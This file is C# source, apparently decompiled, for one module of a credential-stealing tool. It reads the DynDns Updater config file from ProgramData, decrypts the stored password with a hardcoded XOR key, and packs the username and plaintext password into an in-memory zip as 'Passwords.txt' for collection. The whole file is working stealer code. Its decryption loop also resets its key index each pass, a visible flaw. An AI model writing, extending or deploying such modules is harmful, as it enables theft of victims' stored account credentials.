using System;
using System.Globalization;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200003F RID: 63
	public class DynDns : ITarget
	{
		// Token: 0x060000D5 RID: 213 RVA: 0x0000C37C File Offset: 0x0000A57C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\ProgramData\\Dyn\\Updater\\config.dyndns";
			bool flag = File.Exists(text);
			if (flag)
			{
				string[] array = File.ReadAllLines(text);
				bool flag2 = array.Length != 0;
				if (flag2)
				{
					string text2 = "Dyn\\Passwords.txt";
					Counter.CounterApplications counterApplications = new Counter.CounterApplications();
					counterApplications.Name = "Dyn";
					counterApplications.Files.Add(text + " => " + text2);
					counter.Applications.Add(counterApplications);
					zip.AddTextFile(text2, "UserName: " + array[1].Substring(9) + "\r\nPassword: " + this.DecryptDynDns(array[2].Substring(9)));
				}
			}
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x0000C428 File Offset: 0x0000A628
		private string DecryptDynDns(string encrypted)
		{
			string text = string.Empty;
			for (int i = 0; i < encrypted.Length; i += 2)
			{
				text += ((char)int.Parse(encrypted.Substring(i, 2), NumberStyles.HexNumber)).ToString();
			}
			char[] array = text.ToCharArray();
			char[] array2 = new char[text.Length];
			for (int j = 0; j < array2.Length; j++)
			{
				try
				{
					int num = 0;
					array2[j] = (char)(array[j] ^ Convert.ToChar("t6KzXhCh".Substring(num, 1)));
					num = (num + 1) % 8;
				}
				catch (Exception)
				{
				}
			}
			return new string(array2);
		}
	}
}
